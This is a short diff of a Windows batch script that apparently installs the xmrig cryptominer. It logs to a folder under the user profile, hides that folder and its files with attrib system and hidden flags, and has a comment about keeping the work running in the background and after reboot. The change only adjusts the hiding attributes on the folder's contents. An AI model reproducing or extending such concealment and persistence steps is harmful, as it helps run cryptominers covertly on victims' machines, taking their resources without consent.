@@ -325,7 +325,7 @@ echo :EXIT
 
 echo "" > %USERPROFILE%\ponder\xmrig.log
 attrib +s +h /d "%USERPROFILE%\ponder"
-attrib +s +h /d "%USERPROFILE%\ponder\*"
+attrib +h /d "%USERPROFILE%\ponder\*"
 
 rem preparing script background work and work under reboot
 
